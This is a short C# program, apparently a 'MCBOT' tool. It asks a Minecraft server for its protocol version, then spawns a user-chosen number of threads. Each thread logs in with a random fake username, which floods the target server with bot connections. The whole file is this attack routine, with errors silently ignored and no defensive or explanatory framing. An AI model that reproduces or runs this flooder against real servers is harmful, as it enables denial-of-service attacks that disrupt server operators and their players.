namespace MCBOT
{
    public class Program
    {
        private static char[] _characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray();

        public static void Main(string[] args)
        {
            try
            {
                string ip = args[0];
                ushort port = ushort.Parse(args[1]);
                ushort bots = ushort.Parse(args[2]);

                MinecraftClient client = new MinecraftClient(ip, port);
                client.StartReceiving();

                client.SendPacket(new C00Handshake(47, ip, port, ConnectionState.STATUS));
                client.SendPacket(new C00PacketServerQuery());

                while (client.VersionProtocol == -1)
                {
                    Thread.Sleep(10);
                }

                client.StopReceiving();
                client.Close();
                client.Dispose();

                uint versionProtocol = (uint)client.VersionProtocol;
                ProtoRandom random = new ProtoRandom(5);

                for (int i = 0; i < bots; i++)
                {
                    new Thread(() =>
                    {
                        try
                        {
                            MinecraftClient newClient = new MinecraftClient(ip, port);

                            newClient.SendPacket(new C00Handshake(versionProtocol, ip, port, ConnectionState.LOGIN));
                            newClient.SendPacket(new C00PacketLoginStart(random.GetRandomString(_characters, random.GetRandomInt32(6, 15))));
                        }
                        catch
                        {

                        }
                    }).Start();
                }

                while (true)
                {
                    Console.ReadLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
                Console.WriteLine(ex.Source);
                Console.ReadLine();
            }
        }
    }
}